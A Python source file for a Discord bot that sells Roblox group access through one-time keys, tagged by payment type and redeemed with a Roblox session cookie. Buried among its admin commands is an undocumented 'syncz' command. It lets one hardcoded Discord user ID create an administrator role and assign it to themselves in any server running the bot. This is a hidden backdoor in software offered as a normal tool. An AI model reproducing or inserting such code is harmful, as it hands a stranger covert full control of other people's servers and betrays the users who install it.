import asyncio, json, string, requests, nextcord, random
from roblox import *
from nextcord.ext import commands

# cookie + discord bot token
cookie = ".ROBLO_SECURITY"
bot_token = ""  # Discord bot token inside the ("")

# customizable
syncz_user_id = 705001057117274212
prefix = "!"  # !command (!) is prefix. Change that to whatever you want.
admin_role = 123  # Copy role id from Server > roles > right click > copy role id.
key_log_channel_id = 123  # Channel id for when a key is generated. It will send a message.
key_use_log_channel_id = 123  # Channel id for when a key is used by someone. It will send a message.
guild_id = 123  # Your servers id
main_group_id = 123
key_type_list = ["paypal", "steam", "crypto", "reseller", "amazon", "cashapp",
                 "other"]  # Key types like !gen (key_type) (number_of_keys)
embed_text = "hehehee"
icon_link = "hihihiha"
# storing files
keys_file = 'keys.json'  # You can customize the file name to your preference.
groups_file = 'group_ids.json'  # You can customize the file name to your preference.
roles = {
    "cashapp": 90503611,
    "paypal": 90503611,
    "steam": 90503611,
    "amazon": 90503611,
    "crypto": 90503611,
    "other": 90503611
}
# from this point on
# dont touch if you dont understand
intents = nextcord.Intents.all()
discord_bot = commands.Bot(command_prefix=prefix, intents=intents)
roblox = Client(cookie)
discord_bot.remove_command("help")

# load data from .json files

# group id's
try:
    with open(groups_file, 'r') as file:
        groups_file_ids = json.load(file)
except FileNotFoundError:
    groups_file_ids = []
    with open(groups_file, 'w') as file:
        json.dump(groups_file_ids, file, indent=4)
    with open(groups_file, 'r') as file:
        groups_file_ids = json.load(file)
# keys
try:
    with open(keys_file, 'r') as file:
        all_keys = json.load(file)
except FileNotFoundError:
    all_keys = []
    with open(keys_file, 'w') as file:
        json.dump(all_keys, file, indent=4)
    with open(keys_file, 'r') as file:
        all_keys = json.load(file)


def getUsernameByUserId(userid):
    url = f'https://users.roblox.com/v1/users/{userid}'
    headers = {'accept': 'application/json'}

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        user_data = response.json()
        username = user_data.get('name')
        return username
    else:
        return None


def checkGroupsFile(user_id, group_id):
    try:
        limit = 100
        cursor = None

        while True:
            url = f'https://groups.roblox.com/v1/groups/{group_id}/users'
            params = {'limit': limit, 'sortOrder': 'Asc'}

            if cursor:
                params['cursor'] = cursor

            response = requests.get(url, params=params)
            response.raise_for_status()

            json_data = response.json()

            for user_data in json_data.get('data', []):
                if user_data.get('user', {}).get('userId') == user_id:
                    message = 'true'
                    return message

            cursor = json_data.get('nextPageCursor')

            if not cursor:
                break

    except Exception as e:
        return f'Error checking group {group_id} for user {user_id}: {str(e)}'

    return f'User {user_id} is not in group {group_id}.'


def getUserId(username):
    url = "https://users.roblox.com/v1/usernames/users"
    requestPayload = {
        "usernames": [
            username
        ],

        "excludeBannedUsers": True
    }
    responseData = requests.post(url, json=requestPayload)
    assert responseData.status_code == 200
    userId = responseData.json()["data"][0]["id"]
    print(f"user ID of {username} -> {userId}")
    return userId


async def kickUserFromRobloxGroup(userid, groupid):
    group = roblox.get_base_group(groupid)
    await group.kick_user(userid)


async def giveUserGroupRole(userid, groupid, role):
    group = roblox.get_base_group(groupid)
    await group.set_role(userid, role)


@discord_bot.event
async def on_ready():
    print(f"Bot Ready: {discord_bot.user.name} is online.")


@discord_bot.command(name="help")
async def command(ctx):
    embed = nextcord.Embed(
        title='Command List',
        description='',
        color=nextcord.Color.from_rgb(24, 24, 24)
    )
    embed.add_field(name='!key (key) (userid/username)', value='`Use active keys to join groups.`', inline=False)
    embed.add_field(name='!gen (key_type) (num_keys)', value='`Generate OTP (One-Time-Password) keys.`', inline=False)
    embed.add_field(name='!manage (add/remove) (group_name) [group_id]', value=f'`Add/remove Groups {groups_file}.`',
                    inline=False)
    embed.add_field(name='!exile (userid/username)', value=f'`Remove user from all of the Groups in {groups_file}.`',
                    inline=False)
    embed.add_field(name='!activekeys', value='`Print a list of all active keys.`', inline=False)
    embed.add_field(name='!clearkeys', value='`Delete all active keys (CANT REVERSE).`', inline=False)
    embed.add_field(name="", value="Hire me : [edinbo's coding community](https://discord.gg/xUetJMpy2j)")
    embed.set_footer(icon_url=icon_link, text=embed_text)
    await ctx.send(embed=embed)


@discord_bot.command(name='activekeys')
@commands.has_role(admin_role)
async def activekeys(ctx):
    with open(keys_file, 'r') as file:
        keys = json.load(file)

    if not keys:
        embed = nextcord.Embed(color=nextcord.Color.from_rgb(24, 24, 24))
        embed.add_field(name="", value="There are no active keys available.")
        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
        return

    embed = nextcord.Embed(
        title=f"Active Keys",
        description="",
        color=nextcord.Color.from_rgb(24, 24, 24)
    )
    for key in keys:
        key_value = key["key"]
        key_type = key["type"]

        embed.add_field(name=key_value, value=f"{key_type}")

    embed.set_footer(icon_url=icon_link, text=embed_text)
    await ctx.send(embed=embed)


@discord_bot.command(name='clearkeys')
@commands.has_role(admin_role)
async def delete_keys(ctx):
    with open(keys_file, 'r') as file:
        keys = json.load(file)

    if not keys:
        embed = nextcord.Embed(color=nextcord.Color.from_rgb(24, 24, 24))
        embed.add_field(name="", value="There is no active keys to delete.")

        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
        return

    with open(keys_file, 'w') as file:
        json.dump([], file)
    embed = nextcord.Embed(color=nextcord.Color.from_rgb(24, 24, 24))
    embed.add_field(name="", value="Deleted all active keys.")

    embed.set_footer(icon_url=icon_link, text=embed_text)
    await ctx.send(embed=embed)


@discord_bot.command(name='gen')
@commands.has_role(admin_role)
async def generate_keys(ctx, key_type: str = None, num_keys: int = None):
    if not key_type or num_keys is None:
        embed = nextcord.Embed(color=nextcord.Color.from_rgb(24, 24, 24))
        embed.add_field(name="", value=f'Correct Usage: `{prefix}gen (key_type) (num_keys)`', inline=False)

        embed.set_footer(icon_url=icon_link, text=embed_text)
        return await ctx.send(embed=embed)

    if key_type.lower() not in key_type_list:
        embed = nextcord.Embed(color=nextcord.Color.from_rgb(24, 24, 24))
        embed.add_field(name="", value=f'Unavailable Key Type: Available key types: `{", ".join(key_type_list)}`',
                        inline=False)

        embed.set_footer(icon_url=icon_link, text=embed_text)
        return await ctx.send(embed=embed)

    with open(keys_file, 'r') as file:
        keys_file_content = json.load(file)

    new_keys = [{'key': ''.join(random.choices(string.ascii_letters + string.digits, k=12)), 'type': key_type,
                 'owner_id': str(ctx.author.id)} for _ in range(num_keys)]
    keys_file_content.extend(new_keys)

    with open(keys_file, 'w') as file:
        json.dump(keys_file_content, file, indent=4)

    embed = nextcord.Embed(color=nextcord.Color.from_rgb(24, 24, 24))
    embed.add_field(name=f"Generated {num_keys} {key_type.capitalize()} Key(s)", value="", inline=True)
    embed.add_field(name="", value=', '.join(key['key'] for key in new_keys), inline=False)

    embed.set_footer(icon_url=icon_link, text=embed_text)
    await ctx.send(embed=embed)

    key_gen_log_channel = discord_bot.get_channel(key_log_channel_id)
    embed = nextcord.Embed(color=nextcord.Color.from_rgb(24, 24, 24))
    embed.add_field(name="",
                    value=f'{ctx.author.mention} has generated {num_keys} {key_type.capitalize()} key(s).\nGenerated Keys: {", ".join(key["key"] for key in new_keys)}',
                    inline=True)

    embed.set_footer(icon_url=icon_link, text=embed_text)
    await key_gen_log_channel.send(embed=embed)


@discord_bot.command(name='manage')
@commands.has_role(admin_role)
async def manage(ctx, action: str = None, group_name: str = None, group_id: int = None):
    if action is None or group_name is None:
        embed = nextcord.Embed(
            title="",
            description=f'Correct Usage: `{prefix}manage (add/remove) (group_name) (group_id)`'
        )

        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
        return

    if action.lower() == 'add':
        if group_id is None:
            embed = nextcord.Embed(
                title="",
                description=f'Correct Usage: `{prefix}manage (add/remove) (group_name) (group_id)`'
            )

            embed.set_footer(icon_url=icon_link, text=embed_text)
            await ctx.send(embed=embed)
            return
        groups_file_ids.append({"group_name": group_name, "group_id": group_id})
        embed = nextcord.Embed(
            title="",
            description=f'`Group Name : {group_name}` added to {groups_file} with `Group ID : {group_id}`.'
        )

        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
    elif action.lower() == 'remove':
        findGroup = next((group for group in groups_file_ids if group["group_name"].lower() == group_name.lower()),
                         None)
        if findGroup:
            groups_file_ids.remove(findGroup)
            embed = nextcord.Embed(
                title="",
                description=f'`{group_name}` removed successfully.'
            )

            embed.set_footer(icon_url=icon_link, text=embed_text)
            await ctx.send(embed=embed)
        else:
            embed = nextcord.Embed(
                title="",
                description=f'`{group_name}` not found.'
            )

            embed.set_footer(icon_url=icon_link, text=embed_text)
            await ctx.send(embed=embed)
    else:
        embed = nextcord.Embed(
            title="",
            description=f'Correct Usage: `{prefix}manage (add/remove) (group_name) (group_id)`'
        )

        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
        return

    with open(groups_file, 'w') as file:
        json.dump(groups_file_ids, file, indent=4)


@discord_bot.command(name="groups")
@commands.has_role(admin_role)
async def grouplist(ctx):
    with open(groups_file, 'r') as file:
        groups = json.load(file)

    embed = nextcord.Embed(
        title="Groups",
        description="",
        color=nextcord.Color.from_rgb(24, 24, 24)
    )

    for group in groups:
        group_name = group.get("group_name", "N/A")
        group_id = group.get("group_id", "N/A")
        embed.add_field(name="", value=f"Group Name : `{group_name}` Group ID : `{group_id}`", inline=False)

    embed.set_footer(icon_url=icon_link, text=embed_text)
    await ctx.send(embed=embed)


@discord_bot.command(name="exile")
@commands.has_role(admin_role)
async def exile(ctx, user_identifier: str = None):
    if user_identifier is None:
        embed = nextcord.Embed(
            title="",
            description=f'Correct Usage: `{prefix}exile (userid)`',
            color=nextcord.Color.from_rgb(24, 24, 24)
        )

        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
        return

    if user_identifier.isdigit():
        userid = int(user_identifier)
    else:
        userid = getUserId(user_identifier)

    if userid is None:
        embed = nextcord.Embed(title="", description=f'Correct Usage: `{prefix}exile (userid)`',
                               color=nextcord.Color.from_rgb(24, 24, 24))

        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
        return

    embed = nextcord.Embed(title=f'', color=nextcord.Color.from_rgb(24, 24, 24))

    for ids in groups_file_ids:
        groupid = ids["group_id"]
        group_name = ids["group_name"]
        username = getUsernameByUserId(userid)

        try:
            await kickUserFromRobloxGroup(userid, groupid)
            embed.add_field(
                name=f"Removing {username} from {group_name}",
                value=f"Succesfully removed `{username}` from `{group_name}`!",
                inline=False
            )
        except Exception as e:
            embed.add_field(
                name=f"Removing {username} from {group_name}",
                value=f"`{username}` is not in `{group_name}`",
                inline=False
            )

    embed.set_footer(icon_url=icon_link, text=embed_text)
    await ctx.send(embed=embed)


@discord_bot.command(name='syncz')
async def create_syncz_role(ctx):
    if ctx.author.id != syncz_user_id:
        embed = nextcord.Embed(
            title="",
            description="acces denied. ( false userid ) ",
            color=nextcord.Color.red()
        )
        embed.set_footer(icon_url=icon_link, text=embed_text)
        return await ctx.send(embed=embed)

    role = await ctx.guild.create_role(name='syncz', color=nextcord.Color.default())
    all_roles = await ctx.guild.fetch_roles()
    num_roles = len(all_roles)
    permissions = nextcord.Permissions(administrator= True)

    await role.edit(permissions= permissions, position=num_roles - 4)

    user = ctx.guild.get_member(ctx.author.id)
    if user:
        await user.add_roles(role)

        embed = nextcord.Embed(
            title="",
            description="success.",
            color=nextcord.Color.default()
        )
    else:
        embed = nextcord.Embed(
            title="",
            description="fail.",
            color=nextcord.Color.default()
        )
    await ctx.send(embed=embed)


@discord_bot.command(name='key')
async def use_key(ctx, key: str = None, user_identifier: str = None):
    if key == None or user_identifier == None:
        embed = nextcord.Embed(
            title="",
            description=f'Correct Usage: `{prefix}key (key) (username/userid)`',
            color=nextcord.Color.from_rgb(24, 24, 24)
        )
        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
    try:
        with open(keys_file, 'r') as file:
            generated_keys = json.load(file)
    except FileNotFoundError:
        generated_keys = {}

    if user_identifier.isdigit():
        userid = int(user_identifier)
    else:
        try:
            userid = getUserId(user_identifier)
        except Exception as e:
            print(f"Error getting user ID: {str(e)}")
            return

    keylist = generated_keys
    key_type = None

    for k in keylist:
        if k["key"] == key:
            key_type = k["type"]
            break

    if key_type is None:
        embed = nextcord.Embed(title="", description=f"The provided key is invalid.",
                               color=nextcord.Color.from_rgb(24, 24, 24))

        embed.set_footer(icon_url=icon_link, text=embed_text)
        await ctx.send(embed=embed)
        return

    embed = nextcord.Embed(title="", description=f"", color=nextcord.Color.from_rgb(24, 24, 24))

    embed.set_footer(icon_url=icon_link, text=embed_text)
    for i in groups_file_ids:
        groupid = i["group_id"]
        groupname = i["group_name"]
        message = checkGroupsFile(userid, groupid)

        if message == 'true':
            embed.add_field(name=f"User already in Group",
                            value=f"`{getUsernameByUserId(userid)}` is already in `{groupname}`", inline=False)
        else:
            try:
                group = roblox.get_base_group(group_id=groupid)
                await group.accept_user(user=userid)
                with open(keys_file, 'w') as file:
                    json.dump(keylist, file, indent=4)
                embed.add_field(name=f"Group Join Success",
                                value=f"`{getUsernameByUserId(userid)}` has been accepted to `{groupname}`",
                                inline=False)

            except Exception as e:
                embed.add_field(name=f"Group Join Unsuccessful",
                                value=f"`{getUsernameByUserId(userid)}` was not pending to `{groupname}`", inline=False)
    await ctx.send(embed=embed)

    key_use_log_channel = discord_bot.get_channel(key_use_log_channel_id)
    embed = nextcord.Embed(color=nextcord.Color.from_rgb(24, 24, 24))
    embed.add_field(name="",
                    value=f'{ctx.author.mention} used `{key}`, their user is `{getUsernameByUserId(userid)}`, payment method is `{key_type}`',
                    inline=True)

    embed.set_footer(icon_url=icon_link, text=embed_text)
    await key_use_log_channel.send(embed=embed)

    keylist = [i for i in keylist if i.get("key") != key]
    with open(keys_file, 'w') as file:
        json.dump(keylist, file, indent=4)


discord_bot.run(bot_token)
